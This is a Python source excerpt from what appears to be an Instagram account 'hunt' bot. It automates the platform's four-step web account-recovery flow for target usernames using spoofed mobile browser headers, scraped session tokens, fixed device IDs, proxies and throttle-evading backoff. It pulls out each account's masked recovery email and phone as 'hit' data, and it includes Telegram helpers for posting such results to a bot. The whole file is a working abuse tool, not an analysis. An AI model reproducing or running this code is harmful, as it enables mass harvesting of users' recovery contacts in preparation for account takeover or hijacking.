    m = _WBLOKS_ARM_RE.search(body) if body else None
    return m.group(0) if m else None


def _wbloks_auth_tokens(body, method):
    tokens = []
    for pattern in (
        rf'\\"{method}\\",\s*false,\s*false,\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
        rf'\\"{method}\\",\s*(?:true|false),\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
    ):
        for match in re.finditer(pattern, body):
            token = match.group(1)
            if "|arm" not in token:
                tokens.append(token)
    return tokens


def _wbloks_auth_async_params(text):
    body = _wbloks_strip_json(text)
    if not body:
        return None
    for pattern in _WBLOKS_AUTH_ASYNC_PATTERNS:
        match = re.search(pattern, body)
        if match and "|arm" not in match.group(1):
            return match.group(1)
    return None


def _wbloks_auth_options(text):
    body = _wbloks_strip_json(text)
    if not body:
        return []
    options = []
    for method in ("email", "phone", "password"):
        tokens = _wbloks_auth_tokens(body, method)
        if tokens:
            options.append((method, min(tokens, key=len)))
    return options


def _wbloks_pick_step3(options, response_text=""):
    methods = {m: t for m, t in options}
    if "phone" in methods:
        return "phone", methods["phone"], "1"
    if "email" in methods:
        return "email", methods["email"], "0"
    body = _wbloks_strip_json(response_text)
    if _wbloks_masked_phone(response_text) or "mobile number" in body.lower():
        token = _wbloks_auth_async_params(response_text)
        if token:
            return "phone", token, "1"
    if "password" in methods:
        return "password", methods["password"], "0"
    return "phone", "", "1"


def _wbloks_step2_route(text):
    body = _wbloks_strip_json(text)
    m = _WBLOKS_STEP2_ROUTE_RE.search(body or "")
    if m:
        return m.group(1), m.group(2)
    return _WBLOKS_AUTH_METHOD_APPID, "19q6u5:2"


def _wbloks_qpl_instance(text, anchor="authentication_confirmation.async"):
    body = _wbloks_strip_json(text)
    pos = body.find(anchor)
    if pos < 0:
        return None
    m = re.search(r"i64\.Const,\s*(\d+)", body[pos : pos + 12000])
    return m.group(1) if m else None


def _wbloks_step4_screen(text):
    body = _wbloks_strip_json(text)
    m = _WBLOKS_STEP4_ROUTE_RE.search(body or "")
    return m.group(1) if m else None


def _wbloks_visible_texts(text):
    body = _wbloks_strip_json(text)
    if not body:
        return []
    seen, visible = set(), []
    for raw in re.findall(r'"text":"((?:\\.|[^"\\])*)"', body):
        item = raw
        if "\\u" in item:
            try:
                item = bytes(item, "utf-8").decode("unicode_escape")
            except UnicodeDecodeError:
                pass
        item = item.replace("\\u0040", "@").strip()
        if not item or item in seen or item.startswith("(bk."):
            continue
        seen.add(item)
        visible.append(item)
    return visible


def _wbloks_masked_email(text):
    body = _wbloks_strip_json(text).replace("\\u0040", "@")
    if not body:
        return None
    sent = _WBLOKS_SENT_CODE_EMAIL_RE.search(body)
    if sent:
        return sent.group(1).rstrip(".,;:!? ")
    m = _WBLOKS_MASKED_EMAIL_RE.search(body)
    if m:
        return m.group(0).rstrip(".,;:!? ")
    for item in _wbloks_visible_texts(text):
        sent = _WBLOKS_SENT_CODE_EMAIL_RE.search(item)
        if sent:
            return sent.group(1).rstrip(".,;:!? ")
        emb = _WBLOKS_MASKED_EMAIL_RE.search(item)
        if emb:
            return emb.group(0).rstrip(".,;:!? ")
        if "*" in item and "@" in item:
            return item.rstrip(".,;:!? ")
        if _WBLOKS_FULL_EMAIL_RE.fullmatch(item.strip()):
            return item.strip()
    return None


def _wbloks_masked_phone(text):
    body = _wbloks_strip_json(text)
    if not body:
        return None
    m = _WBLOKS_MASKED_PHONE_RE.search(body)
    if m:
        return m.group(0)
    for item in _wbloks_visible_texts(text):
        if item.startswith("+") and "*" in item:
            return item
    return None


def _wbloks_jazoest(fb_dtsg):
    return str(2 + sum(ord(c) for c in fb_dtsg))


def _wbloks_bootstrap_pull(use_logged_in, proxies=None):
    sess = requests.Session()
    cookies = _WBLOKS_BASE_COOKIES.copy()
    if use_logged_in:
        cookies.update(_WBLOKS_LOGGED_IN_COOKIES)
    sess.cookies.update(cookies)
    resp = sess.get(
        _HIT_RECOVERY_RESET_URL,
        headers={"user-agent": _WBLOKS_USER_AGENT, "accept-language": "en-US"},
        timeout=20,
        proxies=proxies,
    )
    html = resp.text or ""
    lsd = (re.search(r'"LSD",\[\],\{"token":"([^"]+)"', html) or [None, ""])[1]
    fb_dtsg = (re.search(r'"dtsg":\{"token":"([^"]+)"', html) or [None, ""])[1]
    rev = (re.search(r'"client_revision":(\d+)', html) or [None, ""])[1]
    hsi = (re.search(r'"hsi":"(\d+)"', html) or [None, ""])[1]
    spin_t = (re.search(r'"__spin_t":(\d+)', html) or [None, ""])[1]
    merged = cookies.copy()
    merged.update(requests.utils.dict_from_cookiejar(sess.cookies))
    return {
        "cookies": merged,
        "lsd": (lsd or "").strip(),
        "fb_dtsg": (fb_dtsg or "").strip(),
        "jazoest": _wbloks_jazoest(fb_dtsg) if fb_dtsg else "",
        "__rev": rev,
        "__spin_r": rev,
        "__hsi": hsi,
        "__spin_t": spin_t,
        "status_code": resp.status_code,
        "used_logged_in": use_logged_in,
    }


def _wbloks_bootstrap(proxies=None):
    boot = _wbloks_bootstrap_pull(_WBLOKS_USE_LOGGED_IN_SESSION, proxies)
    if (not boot["lsd"] or not boot["fb_dtsg"]) and _WBLOKS_USE_LOGGED_IN_SESSION:
        boot = _wbloks_bootstrap_pull(False, proxies)
        boot["fallback_logged_out"] = True
    if boot.get("status_code") == 429:
        boot["rate_limited"] = True
    return boot


def _wbloks_apply_tokens(data, boot):
    for key in ("fb_dtsg", "lsd", "jazoest", "__rev", "__spin_r", "__hsi", "__spin_t"):
        value = boot.get(key)
        if value:
            data[key] = value


def _wbloks_headers(boot):
    return {
        "accept": "*/*",
        "accept-language": "en-US",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
        "origin": "https://www.instagram.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": _HIT_RECOVERY_RESET_URL,
        "sec-ch-prefers-color-scheme": "dark",
        "sec-ch-ua": (
            '"Chromium";v="127", "Not)A;Brand";v="99", '
            '"Microsoft Edge Simulate";v="127", "Lemur";v="127"'
        ),
        "sec-ch-ua-full-version-list": (
            '"Chromium";v="127.0.6533.144", "Not)A;Brand";v="99.0.0.0", '
            '"Microsoft Edge Simulate";v="127.0.6533.144", "Lemur";v="127.0.6533.144"'
        ),
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-model": '"V2249"',
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-platform-version": '"15.0.0"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": _WBLOKS_USER_AGENT,
        "x-fb-lsd": boot["lsd"],
    }


def _wbloks_form_data(boot, req_id, params_json, *, step=2):
    step_s = "1sndd2:lncbw1:xx4sk7" if step == 1 else "xndytq:2om9fa:zax0fu"
    step_hsi = "7650768943143544687" if step == 1 else "7650778362067551766"
    data = {
        "__d": "www",
        "__user": "0",
        "__a": "1",
        "__req": req_id,
        "__hs": "20617.HYP:instagram_web_pkg.2.1...0",
        "dpr": "3",
        "__ccg": "GOOD",
        "__rev": boot.get("__rev", "1041417520"),
        "__s": step_s,
        "__hsi": boot.get("__hsi", step_hsi),
        "__dyn": (
            "7xeUjG1mwt8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwGwQwoEcE7O2l0"
            "Fwqo31w9O0H8jwae4UaEW2G0AEco5G0zK5o4q0HU1IEGdwtU662O0Lo6-3u2WE15E6O1FwlAcwnJ6goK1s"
            "AwHxW1ow8q0EoK9x60ma1XwqU1eUdo"
        ),
        "__csr": (
            "hA4Ivf92fnlEDTnlvt7p5mRF_P39bj-KFD-UK9BHC-jIxHFoGj8UXx2ch4Upxi6Zx62OE-8aGVAhUSfByqgZ16qaAUlF6"
            "CByFUZ4UC8z9byrzEsyE8qwsU4Nxu5Ea98K3eEkDy9E4a9-mU4K3y4oO2K4Elwlo6iE3KxC5E05q602DK00ReXyU3Mw0Lva04Gqz"
            "U0yK0cAy43G0L81EFnw7eohDS09Ag1ySEjglO0YDo0hzzo5p00h4E0Ny03qS0eiCg"
        ),
        "__hsdp": "gN2sAehsWpwidhk8Bm4O1-Q9wC-1NwaiEc84O06wFo04m605PU9U1eE0lNg12o",
        "__hblp": (
            "0hU1_awMzE4C0SUhwRwd63a3C0OE6W0kK3C1WwrU1fE0Jy0z808WqU14U1gE1Vo1vodU3Lw3ao9U1eKq0cvw4Jw4qg2Bzo5m1Qw9u0vzw"
        ),
        "__sjsp": "gN2sAehsWpwidh7d55m4O1-Q9wC-1NwaiEc8",
        "__comet_req": "7",
        "fb_dtsg": boot.get("fb_dtsg", ""),
        "jazoest": boot.get("jazoest", ""),
        "lsd": boot.get("lsd", ""),
        "__spin_r": boot.get("__spin_r", "1041417520"),
        "__spin_b": "trunk",
        "__spin_t": boot.get("__spin_t", "1781335650"),
        "__crn": "comet.igweb.PolarisWebBloksAccountRecoveryRoute",
        "params": params_json,
    }
    return data


def _wbloks_post(boot, *, appid, req_type, params_json, req_id, wd, step=2, proxies=None):
    return _wbloks_http.post(
        _WBLOKS_FETCH_URL,
        params={"appid": appid, "type": req_type, "__bkv": _WBLOKS_BKV},
        cookies={**boot["cookies"], "wd": wd},
        headers=_wbloks_headers(boot),
        data=_wbloks_form_data(boot, req_id, params_json, step=step),
        timeout=30,
        proxies=proxies,
    )


def _wbloks_step1_params(username):
    return (
        '{"params":"{\\"server_params\\":{\\"event_request_id\\":\\"5c2d5ee9-f0f2-4c44-8e89-612a38e875b2\\",'
        '\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"217380720300109\\",'
        f'\\"device_id\\":\\"{_WBLOKS_DEVICE_ID}\\",\\"family_device_id\\":null,\\"waterfall_id\\":null,'
        '\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,'
        '\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,'
        '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"unknown\\",'
        f'\\"context_data\\":\\"{_WBLOKS_STEP1_CONTEXT}\\",\\"client_input_params\\":{{'
        '\\"zero_balance_state\\":null,'
        f'\\"search_query\\":\\"{username}\\",'
        '\\"fetched_email_list\\":[],\\"fetched_email_token_list\\":{},\\"sso_accounts_auth_data\\":[],'
        '\\"sfdid\\":\\"\\",\\"text_input_id\\":\\"zy88df:105\\",\\"encrypted_msisdn\\":\\"\\",'
        '\\"headers_infra_flow_id\\":\\"\\",\\"was_headers_prefill_available\\":0,'
        '\\"was_headers_prefill_used\\":0,\\"ig_oauth_token\\":[],\\"android_build_type\\":\\"\\",'
        '\\"is_whatsapp_installed\\":0,\\"device_network_info\\":null,\\"accounts_list\\":[],'
        '\\"is_oauth_without_permission\\":0,\\"search_screen_type\\":\\"email_or_username\\",'
        '\\"ig_vetted_device_nonce\\":\\"\\",\\"gms_incoming_call_retriever_eligibility\\":\\"client_not_supported\\",'
        '\\"auth_secure_device_id\\":\\"\\",\\"blocked_uids\\":[],\\"cloud_trust_token\\":null,'
        '\\"network_bssid\\":null,\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}}'
    )


def _wbloks_step2_params(context_data, screen_id):
    return (
        '{"params":"{\\"server_params\\":{\\"device_id\\":\\"'
        + _WBLOKS_DEVICE_ID
        + '\\",\\"is_platform_login\\":0,\\"is_from_logged_out\\":0,'
        '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
        '\\"login_entry_point\\":\\"account_recovery\\",\\"context_data\\":\\"'
        + (context_data or "")
        + '\\",\\"back_nav_action\\":\\"BACK\\",\\"INTERNAL_INFRA_screen_id\\":\\"'
        + screen_id
        + '\\"},\\"client_input_params\\":{\\"lois_settings\\":{\\"lois_token\\":\\"\\"},'
        '\\"zero_balance_state\\":\\"\\",\\"aac\\":\\"\\"}}"}'
    )


def _wbloks_step3_dual_params(context_data, auth_method, rejected, async_params):
    return (
        '{"params":"{\\"server_params\\":{\\"device_id\\":\\"'
        + _WBLOKS_DEVICE_ID
        + '\\",\\"auth_method\\":\\"'
        + auth_method
        + '\\",\\"is_auth_method_rejected\\":'
        + rejected
        + ',\\"auth_method_async_params\\":\\"'
        + async_params
        + '\\",\\"context_data\\":\\"'
        + context_data
        + '\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,'
        '\\"INTERNAL__latency_qpl_instance_id\\":\\"7694035200197\\",'
        '\\"family_device_id\\":null,\\"waterfall_id\\":null,'
        '\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,'
        '\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,'
        '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
        '\\"login_entry_point\\":\\"account_recovery\\"},'
        '\\"client_input_params\\":{\\"zero_balance_state\\":\\"\\",\\"android_build_type\\":\\"\\",'
        '\\"cloud_trust_token\\":null,\\"network_bssid\\":null,'
        '\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}'
    )


def _wbloks_step3_email_params(context_data, qpl_instance_id):
    return (
        '{"params":"{\\"server_params\\":{\\"device_id\\":\\"'
        + _WBLOKS_DEVICE_ID
        + '\\",\\"event_request_id\\":\\"'
        + str(uuid.uuid4())
        + '\\",\\"is_auth_method_rejected\\":1,\\"context_data\\":\\"'
        + context_data
        + '\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,'
        '\\"INTERNAL__latency_qpl_instance_id\\":\\"'
        + qpl_instance_id
        + '\\",\\"family_device_id\\":null,\\"waterfall_id\\":null,'
        '\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,'
        '\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,'
        '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
        '\\"login_entry_point\\":\\"account_recovery\\"},'
        '\\"client_input_params\\":{\\"zero_balance_state\\":\\"\\",\\"android_build_type\\":\\"\\",'
        '\\"cloud_trust_token\\":null,\\"network_bssid\\":null,'
        '\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}'
    )


def _wbloks_step4_params(context_data, screen_id):
    return (
        '{"params":"{\\"server_params\\":{\\"device_id\\":\\"'
        + _WBLOKS_DEVICE_ID
        + '\\",\\"is_platform_login\\":0,\\"is_from_logged_out\\":0,'
        '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
        '\\"login_entry_point\\":\\"account_recovery\\",\\"context_data\\":\\"'
        + context_data
        + '\\",\\"back_nav_action\\":\\"BACK\\",\\"INTERNAL_INFRA_screen_id\\":\\"'
        + screen_id
        + '\\"},\\"client_input_params\\":{\\"lois_settings\\":{\\"lois_token\\":\\"\\"},'
        '\\"machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"aac\\":\\"\\"}}"}'
    )


def _wbloks_ig_failed(text, status_code=200):
    """Detect IG throttle/generic failure without false positives on huge ok payloads."""
    body = _wbloks_strip_json(text)
    if not body or body.startswith("<!DOCTYPE"):
        return True, "invalid_response"
    if int(status_code or 0) == 429:
        return True, "rate_limited"
    if re.search(r'"error"\s*:\s*[1-9]\d*', body):
        return True, "rate_limited"
    if '"errorSummary"' in body and "|arm" not in body:
        return True, "invalid_response"
    return False, ""


def _wbloks_hunt_backoff():
    """Brief pause when hunt floods IG — reduces invalid_response during hits."""
    with _hunt_inflight_lock:
        inflight = int(_hunt_inflight)
    if inflight >= 32:
        time.sleep(8.0)
    elif inflight >= 20:
        time.sleep(5.0)
    elif inflight >= 12:
        time.sleep(2.5)


_wbloks_http = requests.Session()


def _wbloks_run_recovery_once(username):
    """Single wbloks attempt — 4-step IG recovery."""
    started = time.perf_counter()
    contacts = {"email": None, "phone": None}

    def merge_resp(text):
        e = _wbloks_masked_email(text)
        p = _wbloks_masked_phone(text)
        if e:
            contacts["email"] = e
        if p:
            contacts["phone"] = p

    boot = _wbloks_bootstrap()
    if boot.get("rate_limited") or not boot.get("lsd") or not boot.get("fb_dtsg"):
        err = "rate_limited" if boot.get("rate_limited") or boot.get("status_code") == 429 else "session_bootstrap_failed"
        return {
            "ok": False,
            "username": username,
            "flow": "unknown",
            "email": None,
            "phone": None,
            "error": err,
            "response_time_ms": round((time.perf_counter() - started) * 1000),
        }

    r1 = _wbloks_post(
        boot,
        appid=_WBLOKS_SEARCH_APPID,
        req_type="action",
        params_json=_wbloks_step1_params(username),
        req_id="j",
        wd="450x1231",
        step=1,
    )
    body1 = _wbloks_strip_json(r1.text)
    failed, fail_err = _wbloks_ig_failed(r1.text, r1.status_code)
    if failed:
        return {
            "ok": False,
            "username": username,
            "flow": "unknown",
            "email": None,
            "phone": None,
            "error": fail_err,
            "response_time_ms": round((time.perf_counter() - started) * 1000),
        }

    context_token = _wbloks_arm_token(r1.text)
    if not context_token:
        return {
            "ok": False,
            "username": username,
            "flow": "unknown",
            "email": None,
            "phone": None,
            "error": "search_failed",
            "response_time_ms": round((time.perf_counter() - started) * 1000),
        }

    step2_appid, step2_screen_id = _wbloks_step2_route(r1.text)
    dual = step2_appid == _WBLOKS_AUTH_METHOD_APPID
    flow = "dual_auth" if dual else "email_confirmation"

    r2 = _wbloks_post(
        boot,
        appid=step2_appid,
        req_type="app",
        params_json=_wbloks_step2_params(context_token, step2_screen_id),
        req_id="h",
        wd="450x908",
        step=2,
    )
    merge_resp(r2.text)
    context_token = _wbloks_arm_token(r2.text) or context_token
    step2_arm = context_token or ""

    if dual:
        opts = _wbloks_auth_options(r2.text)
        auth_m, async_t, rejected = _wbloks_pick_step3(opts, r2.text)
        if not async_t:
            async_t = _wbloks_auth_async_params(r2.text) or ""
        step3_appid = _WBLOKS_AUTH_METHOD_ASYNC_APPID
        step3_json = _wbloks_step3_dual_params(context_token or "", auth_m, rejected, async_t)
    else:
        step3_appid = _WBLOKS_EMAIL_CONFIRM_ASYNC_APPID
        qpl = _wbloks_qpl_instance(r2.text) or "7694035200197"
        step3_json = _wbloks_step3_email_params(step2_arm, qpl)

    r3 = _wbloks_post(
        boot,
        appid=step3_appid,
        req_type="action",
        params_json=step3_json,
        req_id="k",
        wd="450x908",
        step=2,
    )
    merge_resp(r3.text)
    context_token = _wbloks_arm_token(r3.text) or context_token
    step4_screen = _wbloks_step4_screen(r3.text) or "19w3pw:2"
    step4_ctx = context_token or step2_arm

    r4 = _wbloks_post(
        boot,
        appid=_WBLOKS_INITIATE_VIEW_APPID,
        req_type="app",
        params_json=_wbloks_step4_params(step4_ctx or "", step4_screen),
        req_id="l",
        wd="450x908",
        step=2,
    )
    merge_resp(r4.text)

    ok = bool(contacts["email"] or contacts["phone"])
    result = {
        "ok": ok,
        "username": username,
        "flow": flow,
        "email": contacts["email"],
        "phone": contacts["phone"],
        "response_time_ms": round((time.perf_counter() - started) * 1000),
    }
    if not ok:
        result["error"] = "no_contacts_found"
    return result


_WBLOKS_RETRY_ATTEMPTS = 5
_WBLOKS_RETRY_SLEEP_SEC = 2.0
_WBLOKS_RETRYABLE_ERRORS = frozenset({
    "session_bootstrap_failed",
    "rate_limited",
    "invalid_response",
    "network_error",
})
_HIT_CONTACT_FETCH_ATTEMPTS = 6 if not _IS_TERMUX else 4
_HIT_CONTACT_FETCH_SLEEP_SEC = 3.0
_HIT_CONTACT_BG_RETRY_ATTEMPTS = 8 if not _IS_TERMUX else 6
_HIT_CONTACT_BG_RETRY_SLEEP_SEC = 12.0
_DEFINITIVE_RECOVERY_ERRORS = frozenset({
    "no_contacts_found",
    "no_contact",
    "ig_failed",
    "account_not_found",
    "user_not_found",
})
_RECOVERY_TRANSIENT_API_MARKERS = (
    "timeout", "timed out", "connection", "network", "unreachable",
    "offline", "refused", "reset", "502", "503", "504", "broken pipe",
    "name resolution", "eof", "ssl", "api offline", "temporarily",
)


def _recovery_result_transient(data=None, api_err=None):
    """True when failure is likely network/API — not a firm IG empty result."""
    if api_err:
        s = str(api_err).lower()
        if any(m in s for m in _RECOVERY_TRANSIENT_API_MARKERS):
            return True
        if _recovery_api_needs_fallback(api_err):
            return True
        return False
    if not isinstance(data, dict):
        return True
    if data.get("ok") or data.get("email") or data.get("phone"):
        return False
    err = (data.get("error") or "").strip()
    if err in _WBLOKS_RETRYABLE_ERRORS:
        return True
    if err in _DEFINITIVE_RECOVERY_ERRORS:
        return False
    return not err


def _wbloks_run_recovery(username):
    """Wbloks with 3 attempts / 2s pause on network or bootstrap blips."""
    started = time.perf_counter()
    last = None
    for attempt in range(1, _WBLOKS_RETRY_ATTEMPTS + 1):
        try:
            result = _wbloks_run_recovery_once(username)
        except requests.RequestException as exc:
            result = {
                "ok": False,
                "username": username,
                "flow": "unknown",
                "email": None,
                "phone": None,
                "error": "network_error",
                "detail": str(exc)[:120],
                "attempt": attempt,
            }
        last = result
        if result.get("ok"):
            if attempt > 1:
                result["retries"] = attempt - 1
            result["response_time_ms"] = round((time.perf_counter() - started) * 1000)
            return result
        err = (result.get("error") or "").strip()
        if attempt >= _WBLOKS_RETRY_ATTEMPTS or err not in _WBLOKS_RETRYABLE_ERRORS:
            break
        time.sleep(_WBLOKS_RETRY_SLEEP_SEC * attempt)
    if last is None:
        last = {
            "ok": False,
            "username": username,
            "flow": "unknown",
            "email": None,
            "phone": None,
            "error": "unknown",
        }
    if attempt > 1:
        last["retries"] = attempt - 1
    last["response_time_ms"] = round((time.perf_counter() - started) * 1000)
    return last

def _apply_wbloks_recovery_to_hit_out(out, recovery):
    """Merge run_recovery JSON into hit contact fields (IG-masked as returned)."""
    if not isinstance(recovery, dict):
        return out
    email = (recovery.get("email") or "").strip()
    phone = (recovery.get("phone") or "").strip()
    if email and _is_valid_ig_recovery_email(email) and not out.get("email"):
        out["email"] = email
    if phone and _is_valid_ig_recovery_phone(phone) and not out.get("phone"):
        out["phone"] = phone
    return out


def _pull_hit_contact_recovery(
    uname, ig_info=None, *, read_timeout=None,
):
    """Single /ig_recovery pull via local endpoint. Returns (merged_out, data, api_err)."""
    out = _hit_contact_seed_from_info(ig_info)
    data = None
    err = None
    api_read = read_timeout or _HIT_RECOVERY_API_READ_TIMEOUT
    try:
        data, err = api_fetch_json(
            HUNT_IG_RECOVERY_ROUTE,
            {"username": uname},
            timeout=(HUNT_CONNECT_TIMEOUT, api_read),
        )
        if err or not isinstance(data, dict):
            return out, data, err or "bad_json"
        out = _apply_wbloks_recovery_to_hit_out(out, data)
    except Exception as exc:
        err = str(exc)[:120]
    return out, data, err


def _fetch_hit_contact_wbloks(username, ig_info=None, *, hunt_safe=False):
    """IG recovery with network retries until contacts or a firm IG empty result."""
    uname = (username or "").strip().lstrip("@")
    out = _hit_contact_seed_from_info(ig_info)
    if not uname:
        return out
    max_attempts = _HIT_CONTACT_HUNT_ATTEMPTS if hunt_safe else _HIT_CONTACT_FETCH_ATTEMPTS
    read_timeout = _HIT_CONTACT_HUNT_READ_TIMEOUT if hunt_safe else _HIT_RECOVERY_API_READ_TIMEOUT
    sleep_sec = 2.0 if hunt_safe else _HIT_CONTACT_FETCH_SLEEP_SEC
    last_data = None
    last_err = None
    for attempt in range(1, max_attempts + 1):
        trial_out, data, err = _pull_hit_contact_recovery(
            uname, ig_info,
            read_timeout=read_timeout,
        )
        out = trial_out
        last_data, last_err = data, err
        if out.get("email") or out.get("phone"):
            log_event(
                "HIT ENRICH",
                f"@{uname} recovery ok · "
                f"email={'Y' if out.get('email') else 'N'} "
                f"phone={'Y' if out.get('phone') else 'N'}"
                + (f" · retry #{attempt - 1}" if attempt > 1 else "")
                + (" · hunt-safe" if hunt_safe else ""),
            )
            return out
        if not _recovery_result_transient(data, err):
            err_code = (data or {}).get("error") if isinstance(data, dict) else err
            retries = (data or {}).get("retries") if isinstance(data, dict) else None
            extra = f" after {retries} retries" if retries else ""
            log_event("HIT ENRICH", f"@{uname} recovery empty ({err_code or 'no_contact'}{extra})")
            return out
        if attempt < max_attempts:
            wait = sleep_sec * attempt
            log_event(
                "HIT ENRICH",
                f"@{uname} recovery transient ({(data or {}).get('error') or err or 'network'}) "
                f"· retry {attempt}/{max_attempts} in {wait:.0f}s"
                + (" · hunt-safe" if hunt_safe else ""),
            )
            time.sleep(wait)
    log_event(
        "HIT ENRICH",
        f"@{uname} recovery still transient after {max_attempts} pulls "
        f"({(last_data or {}).get('error') or last_err or 'network'})"
        + (" · defer bg retry" if hunt_safe else ""),
    )
    return out


def _hit_contact_seed_from_info(ig_info):
    out = {}
    joined = _joined_year_from_ig_info(ig_info)
    if joined:
        out["joined"] = joined
    return out


def _hit_contact_log_proxy_pool_once():
    global _hit_proxy_boot_logged
    if _hit_proxy_boot_logged:
        return
    pool = get_hit_proxy_pool()
    if pool and len(pool):
        log_event("HIT PROXY", f"{len(pool)} embedded hit proxies")
    _hit_proxy_boot_logged = True


def _fetch_hit_contact_direct_then_proxy(username, ig_info=None, *, hunt_slot=False):
    """Masked email/phone via wbloks recovery (replaces graphql/mobile enrich)."""
    uname = (username or "").strip().lstrip("@")
    if not uname:
        return _hit_contact_seed_from_info(ig_info)
    return _fetch_hit_contact_wbloks(uname, ig_info, hunt_safe=hunt_slot)


def _fetch_hit_contact_fast(username, ig_info=None):
    """Wbloks recovery for hit enrich."""
    return _fetch_hit_contact_wbloks(username, ig_info)


def _fetch_hit_contact_mobile(username, ig_info=None, existing=None):
    """Retry wbloks when first pass missed email or phone."""
    uname = (username or "").strip().lstrip("@")
    out = dict(existing or _hit_contact_seed_from_info(ig_info))
    if not uname or (out.get("email") and out.get("phone")):
        return out
    return _fetch_hit_contact_wbloks(uname, ig_info)


def _fetch_hit_contact_details(username, ig_info=None):
    """Wbloks recovery — single path for hit contact section."""
    return _fetch_hit_contact_wbloks(username, ig_info)


def _parse_tg_message_id(response):
    if response is None or not getattr(response, "ok", False):
        return None
    try:
        return response.json().get("result", {}).get("message_id")
    except Exception:
        return None


def _format_hit_contact_section(username, ig_info=None, details=None):
    """Joined year + real IG recovery email/phone only (no fake placeholders)."""
    if details is None:
        details = _fetch_hit_contact_details(username, ig_info)
    joined = (details.get("joined") or "").strip()
    email = (details.get("email") or "").strip()
    phone = (details.get("phone") or "").strip()
    header = _hit_recovery_section_header()
    if not (joined or email or phone):
        return (
            header
            + f"  {S['bullet']} Email     <code>—</code>\n"
            + f"  {S['bullet']} Phone     <code>—</code>\n"
            + f"  {S['bullet']} Joined    <code>—</code>\n"
        )
    lines = [header]
    if email:
        lines.append(f"  {S['bullet']} Email     <code>{html.escape(email)}</code>\n")
    else:
        lines.append(f"  {S['bullet']} Email     <code>—</code>\n")
    if phone:
        lines.append(f"  {S['bullet']} Phone     <code>{html.escape(phone)}</code>\n")
    else:
        lines.append(f"  {S['bullet']} Phone     <code>—</code>\n")
    if joined:
        lines.append(f"  {S['bullet']} Joined    <code>{html.escape(joined)}</code>\n")
    return "".join(lines)


def telegram_disable_link_preview(data, method):
    """No URL preview cards under messages or photo captions."""
    if method in ("sendMessage", "editMessageText"):
        data["disable_web_page_preview"] = True
    elif method in ("sendPhoto", "editMessageCaption", "sendDocument"):
        data["link_preview_options"] = json.dumps({"is_disabled": True})
    return data


def append_error_log(source, message, details=None):
    """Persistent error log for Telegram / hunt failures."""
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    with _log_file_lock:
        with open(ERROR_LOG_PATH, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] [{source}] {message}\n")
            if details:
                f.write(f"{details}\n")
            f.write("-" * 72 + "\n")


def telegram_post_with_retries(
    method,
    data=None,
    files=None,
    params=None,
    timeout=None,
    *,
    max_retries=TG_HIT_MAX_RETRIES,
    label="TG",
    fail_fast_400=False,
):
    if not TELEGRAM_ENABLED or not TELEGRAM_API_URL:
        return None
    if data is None:
        data = {}
    if "reply_markup" in data and not isinstance(data["reply_markup"], str):
        data["reply_markup"] = json.dumps(data["reply_markup"])
    data = telegram_disable_link_preview(data, method)
    if timeout is None:
        timeout = TG_POLL_HTTP_TIMEOUT if method == "getUpdates" else TG_SEND_TIMEOUT

    url = f"{TELEGRAM_API_URL}/{method}"
    last_err = "unknown"
    for attempt in range(1, max_retries + 1):
        try:
            response = requests.post(
                url, data=data, files=files, params=params, timeout=timeout,
            )
            if response.ok:
                if attempt > 1:
                    log_event(label, f"OK after {attempt} tries")
                return response
            last_err = f"HTTP {response.status_code}: {response.text[:200]}"
            if response.status_code == 429 and attempt < max_retries:
                wait = min(35.0, TG_HIT_RETRY_BASE_SEC * attempt * 3)
                log_event(f"{label} RETRY", f"rate limit · wait {wait:.0f}s")
                time.sleep(wait)
                continue
            if fail_fast_400 and response.status_code == 400:
                try:
                    desc = response.json().get("description", "").lower()
                    if "message is not modified" in desc:
                        return response
                except Exception:
                    pass
                log_event(f"{label} FAIL", last_err[:100])
                return None
        except Exception as exc:
            last_err = str(exc)

        if attempt < max_retries:
            wait = min(TG_HIT_RETRY_BASE_SEC * attempt, 12.0)
            log_event(
                f"{label} RETRY",
                f"{attempt}/{max_retries} {last_err[:72]} · wait {wait:.0f}s",
            )
            time.sleep(wait)

    log_event(f"{label} FAIL", last_err[:100])
    return None


def send_telegram_request(method, data=None, files=None, params=None, timeout=None, *, max_retries=TG_CMD_MAX_RETRIES):
    return telegram_post_with_retries(
        method, data, files, params, timeout, max_retries=max_retries, label="TG",
    )


def send_telegram_instant(text, *, chat_id=None, reply_markup=None, parse_mode="HTML"):
    """Sub-second Telegram send for command acks — never block on hunt-style retries."""
    if not TELEGRAM_ENABLED:
